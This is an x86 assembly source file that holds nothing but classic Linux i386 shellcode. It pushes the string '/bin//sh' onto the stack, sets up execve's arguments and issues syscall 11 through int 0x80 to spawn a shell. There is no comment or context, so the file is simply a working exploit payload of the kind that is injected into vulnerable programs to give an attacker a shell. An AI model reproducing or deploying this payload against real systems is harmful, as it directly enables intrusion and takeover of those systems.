        .intel_syntax noprefix
        .globl _start
_start:
        push 11
        pop eax
        cdq
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        int 0x80
